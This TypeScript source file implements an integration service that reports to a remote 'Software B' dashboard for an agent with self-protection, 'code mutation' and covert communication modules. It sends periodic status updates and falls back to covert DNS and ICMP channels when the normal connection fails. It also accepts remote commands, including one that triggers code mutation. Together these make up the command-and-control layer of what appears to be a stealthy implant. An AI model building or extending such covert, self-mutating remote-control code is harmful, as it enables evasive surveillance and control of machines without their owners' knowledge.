/**
 * Military-Grade Integration Service
 * Bridges military-grade features with Software B (Admin Dashboard)
 * Ensures all protection, monitoring, and communication features are visible to admins
 */

import { EventEmitter } from 'events';
import { SelfProtectionManager, ProtectionStatus } from '../core/SelfProtectionManager';
import { OSIntegrationManager, OSInfo } from '../core/OSIntegrationManager';
import { CovertCommunicationManager, CovertMessage } from '../core/CovertCommunicationManager';
import { ConnectionManager } from '../core/ConnectionManager';
import { Logger } from '../utils/Logger';

export interface MilitaryGradeStatus {
  // Protection Status
  protection: {
    isActive: boolean;
    integrityValid: boolean;
    lastMutation: string;
    threatsDetected: number;
    selfHealAttempts: number;
    operationalHealth: number;
  };
  
  // OS Integration Status
  osIntegration: {
    platform: string;
    version: string;
    updatesPending: number;
    lastUpdateCheck: string;
    compatibility: boolean;
  };
  
  // Communication Status
  communication: {
    primaryChannel: { name: string; status: string };
    fallbackChannel: { name: string; status: string };
    emergencyChannel: { name: string; status: string };
    messagesQueued: number;
    lastTransmission: string;
  };
  
  // Overall Status
  overall: {
    status: 'operational' | 'degraded' | 'critical';
    message: string;
    timestamp: string;
  };
}

export class MilitaryGradeIntegrationService extends EventEmitter {
  private logger: Logger;
  private selfProtectionManager: SelfProtectionManager;
  private osIntegrationManager: OSIntegrationManager;
  private covertCommsManager: CovertCommunicationManager;
  private connectionManager: ConnectionManager;
  private statusReportInterval: NodeJS.Timeout | null = null;

  constructor(
    selfProtectionManager: SelfProtectionManager,
    osIntegrationManager: OSIntegrationManager,
    covertCommsManager: CovertCommunicationManager,
    connectionManager: ConnectionManager
  ) {
    super();
    this.logger = new Logger('MilitaryGradeIntegration');
    this.selfProtectionManager = selfProtectionManager;
    this.osIntegrationManager = osIntegrationManager;
    this.covertCommsManager = covertCommsManager;
    this.connectionManager = connectionManager;
  }

  /**
   * Initialize integration service
   */
  async initialize(): Promise<void> {
    try {
      this.logger.info('Initializing Military-Grade Integration Service...');

      // Set up event handlers for military-grade events
      this.setupEventHandlers();

      // Start periodic status reporting to Software B
      this.startStatusReporting();

      this.logger.info('Military-Grade Integration Service initialized');
    } catch (error) {
      this.logger.error('Failed to initialize integration service:', error);
      throw error;
    }
  }

  /**
   * Set up event handlers for military-grade components
   */
  private setupEventHandlers(): void {
    // Forward critical events to Software B
    this.on('threat_detected', (data) => this.reportToSoftwareB('threat_alert', data));
    this.on('integrity_violation', (data) => this.reportToSoftwareB('integrity_alert', data));
    this.on('self_heal_performed', (data) => this.reportToSoftwareB('self_heal_event', data));
    this.on('code_mutation', (data) => this.reportToSoftwareB('mutation_event', data));
    this.on('os_update_detected', (data) => this.reportToSoftwareB('os_update_alert', data));
    this.on('channel_failover', (data) => this.reportToSoftwareB('channel_failover_event', data));
  }

  /**
   * Start periodic status reporting to Software B
   */
  private startStatusReporting(): void {
    // Report status every 60 seconds
    this.statusReportInterval = setInterval(async () => {
      try {
        const status = await this.collectMilitaryGradeStatus();
        await this.reportToSoftwareB('military_grade_status', status);
      } catch (error) {
        this.logger.error('Failed to report status:', error);
      }
    }, 60000); // Every 60 seconds

    // Send initial status immediately
    this.collectMilitaryGradeStatus().then((status) => {
      this.reportToSoftwareB('military_grade_status', status);
    });

    this.logger.info('Status reporting started (60s interval)');
  }

  /**
   * Collect comprehensive military-grade status
   */
  async collectMilitaryGradeStatus(): Promise<MilitaryGradeStatus> {
    try {
      // Get protection status
      const protectionStatus = this.selfProtectionManager.getStatus();

      // Get OS info
      const osInfo = this.osIntegrationManager.getOSInfo();

      // Get communication channels status
      const channels = this.covertCommsManager.getChannelStatus();

      // Determine overall status
      const overallStatus = this.determineOverallStatus(
        protectionStatus.operationalHealth,
        osInfo?.updatesPending || 0
      );

      const status: MilitaryGradeStatus = {
        protection: {
          isActive: protectionStatus.isProtected,
          integrityValid: protectionStatus.integrityValid,
          lastMutation: protectionStatus.lastMutation,
          threatsDetected: protectionStatus.threatsDetected,
          selfHealAttempts: protectionStatus.selfHealAttempts,
          operationalHealth: protectionStatus.operationalHealth,
        },
        osIntegration: {
          platform: osInfo?.platform || 'unknown',
          version: osInfo?.version || 'unknown',
          updatesPending: osInfo?.updatesPending || 0,
          lastUpdateCheck: osInfo?.lastUpdateCheck || 'never',
          compatibility: await this.osIntegrationManager.checkCompatibility(),
        },
        communication: {
          primaryChannel: {
            name: channels[0]?.name || 'HTTPS',
            status: channels[0]?.status || 'unknown',
          },
          fallbackChannel: {
            name: channels[1]?.name || 'DNS',
            status: channels[1]?.status || 'standby',
          },
          emergencyChannel: {
            name: channels[2]?.name || 'ICMP',
            status: channels[2]?.status || 'standby',
          },
          messagesQueued: 0, // Would be tracked in real implementation
          lastTransmission: new Date().toISOString(),
        },
        overall: overallStatus,
      };

      return status;
    } catch (error) {
      this.logger.error('Failed to collect status:', error);
      throw error;
    }
  }

  /**
   * Determine overall system status
   */
  private determineOverallStatus(
    health: number,
    updatesPending: number
  ): { status: 'operational' | 'degraded' | 'critical'; message: string; timestamp: string } {
    let status: 'operational' | 'degraded' | 'critical' = 'operational';
    let message = 'All systems operational';

    if (health < 70) {
      status = 'critical';
      message = 'Critical: System health degraded';
    } else if (health < 80 || updatesPending > 5) {
      status = 'degraded';
      message = 'Warning: System performance degraded';
    }

    return {
      status,
      message,
      timestamp: new Date().toISOString(),
    };
  }

  /**
   * Report data to Software B via WebSocket
   */
  private async reportToSoftwareB(type: string, data: any): Promise<void> {
    try {
      if (!this.connectionManager.isConnected()) {
        this.logger.warn('Not connected to Software B, queueing message');
        // In production, would queue for later delivery
        return;
      }

      await this.connectionManager.sendMessage({
        type: `military_grade_${type}`,
        data,
      });

      this.logger.debug(`Reported to Software B: ${type}`);
    } catch (error) {
      this.logger.error(`Failed to report to Software B (${type}):`, error);
      
      // Try covert channel as backup
      try {
        await this.covertCommsManager.sendCovertMessage({
          id: `backup-${Date.now()}`,
          type: `military_grade_${type}`,
          payload: data,
          timestamp: new Date().toISOString(),
          priority: 'high',
        });
      } catch (covertError) {
        this.logger.error('Covert channel backup also failed:', covertError);
      }
    }
  }

  /**
   * Handle command from Software B
   */
  async handleCommandFromSoftwareB(command: string, params: any): Promise<any> {
    try {
      this.logger.info(`Received command from Software B: ${command}`);

      let result: any;

      switch (command) {
        case 'get_military_grade_status':
          result = await this.collectMilitaryGradeStatus();
          break;

        case 'trigger_code_mutation':
          await this.selfProtectionManager.mutateCode();
          result = { success: true, message: 'Code mutation triggered' };
          this.emit('code_mutation', { triggered: 'manually' });
          break;

        case 'verify_integrity':
          const integrityValid = await this.selfProtectionManager.verifyIntegrity();
          result = { integrityValid, message: integrityValid ? 'Integrity valid' : 'Integrity violated' };
          break;

        case 'check_os_updates':
          await this.osIntegrationManager.adaptToOSChanges();
          const osInfo = this.osIntegrationManager.getOSInfo();
          result = { osInfo, message: 'OS update check completed' };
          break;

        case 'test_communication_channels':
          const channelResults = await this.covertCommsManager.testChannels();
          result = { 
            channels: Array.from(channelResults.entries()).map(([name, status]) => ({ name, status })),
            message: 'Channel test completed'
          };
          break;

        case 'get_protection_status':
          result = this.selfProtectionManager.getStatus();
          break;

        case 'force_reconnect':
          await this.connectionManager.reconnect();
          result = { success: true, message: 'Reconnection initiated' };
          break;

        default:
          throw new Error(`Unknown military-grade command: ${command}`);
      }

      // Report command execution to Software B
      await this.reportToSoftwareB('command_result', {
        command,
        success: true,
        result,
      });

      return result;
    } catch (error) {
      this.logger.error(`Command execution failed (${command}):`, error);

      // Report failure to Software B
      await this.reportToSoftwareB('command_result', {
        command,
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
      });

      throw error;
    }
  }

  /**
   * Send real-time alert to Software B
   */
  async sendAlert(level: 'info' | 'warning' | 'critical', message: string, details?: any): Promise<void> {
    try {
      await this.reportToSoftwareB('alert', {
        level,
        message,
        details,
        timestamp: new Date().toISOString(),
      });

      // For critical alerts, also use covert channel
      if (level === 'critical') {
        await this.covertCommsManager.reportCritical(message, details);
      }
    } catch (error) {
      this.logger.error('Failed to send alert:', error);
    }
  }

  /**
   * Stop integration service
   */
  async stop(): Promise<void> {
    try {
      if (this.statusReportInterval) {
        clearInterval(this.statusReportInterval);
        this.statusReportInterval = null;
      }

      this.logger.info('Military-Grade Integration Service stopped');
    } catch (error) {
      this.logger.error('Error stopping integration service:', error);
    }
  }
}
